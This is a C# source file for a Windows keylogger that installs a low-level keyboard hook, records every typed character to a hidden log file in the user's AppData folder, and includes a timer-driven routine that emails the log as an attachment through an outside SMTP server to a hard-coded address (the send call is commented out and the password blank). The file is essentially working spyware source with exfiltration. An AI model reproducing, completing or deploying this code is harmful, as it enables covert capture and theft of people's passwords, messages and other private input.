using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;


namespace keyLoger
{
    public struct keyboardHookStruct
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public int dwExtraInfo;
    }

    public static class KeyLoger
    {
        private static Timer _timer = new Timer(Callback, false /*object state*/, 0/*due time*/, 60000/*period 1 hour*/);

        private static void Callback(object state)
        {
            var tread = new Thread(SendMail);
            //tread.Start();
        }

        private static readonly string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"logs.dat") ;
        #region Constants
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
       
        private const byte VK_RETURN = 0X0D; //Enter
        private const byte VK_SHIFT = 0x10; //shift
        private const byte VK_CAPITAL = 0x14; //capslock
        #endregion

        private static readonly KeyboardHookProc _keyboardHookProc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;
        
        public static void IntializeLL_KEYBOARDHook()
        {
            _hookID = SetHook(_keyboardHookProc);
            Application.Run();
            User32.UnhookWindowsHookEx(_hookID);   
        }

        public delegate int KeyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
        private static IntPtr SetHook(KeyboardHookProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return User32.SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                User32.GetModuleHandle(curModule.ModuleName), 0/*threadId*/);
            }
        }

      private static int HookCallback(int code, int wParam, ref keyboardHookStruct lParam)
        {
            var isDownShift = ((User32.GetKeyState(VK_SHIFT) & 0x80) == 0x80);
            var isDownCapslock = (User32.GetKeyState(VK_CAPITAL) != 0);
            if (code >= 0)
            {
                if (wParam == WM_KEYDOWN)
                {
                    var keyState = new byte[256];
                    User32.GetKeyboardState(keyState);
                    var inBuffer = new byte[2];
                    if (User32.ToAscii(lParam.vkCode, lParam.scanCode, keyState, inBuffer, lParam.flags) != 1)
                        return User32.CallNextHookEx(_hookID, code, wParam, ref lParam);

                    var key = (char)inBuffer[0];
                    
                    if (isDownCapslock || isDownShift)
                    {
                        key = char.IsLetter(key) ? char.ToUpper(key) : Encoding.Default.GetString(inBuffer)[0];
                    }
                     File.AppendAllText(path, inBuffer[0] == VK_RETURN ? Environment.NewLine : key.ToString());
                }
            }
            return User32.CallNextHookEx(_hookID, code, wParam, ref lParam);
        }

      private static void SendMail()
      {
          const string email = "ezrtyj@mail.ru"; // email from be send message
          const string password = "";
          var smtpClient = new SmtpClient("smtp.mail.ru", 587);//new SmtpClient("smtp.gmail.com", 587); //Gmail smtp

          var msg = new MailMessage(new MailAddress(email),/*from*/
              new MailAddress("esrg@gmail.com")/*send to*/)
          {
              Subject = "keyLoger",
              Body = DateTime.Now.ToString(),
              IsBodyHtml = true
          };
          try
          {
              msg.Attachments.Add(new Attachment(path));
          }
          catch (UnauthorizedAccessException e)
          {
              msg.Attachments.Add(new Attachment(path));
          }
          smtpClient.EnableSsl = true;
          smtpClient.Credentials = new NetworkCredential(email, password);
          smtpClient.Send(msg);
      }
    }

    internal static class User32
    {
        #region DLL import
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32")]
        public static extern int ToAscii(
            int uVirtKey,
            int uScanCode,
            byte[] lpbKeyState,
            byte[] lpwTransKey,
            int fuState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, KeyLoger.KeyboardHookProc callback, IntPtr hInstance, uint threadId);
        #endregion
    }
}
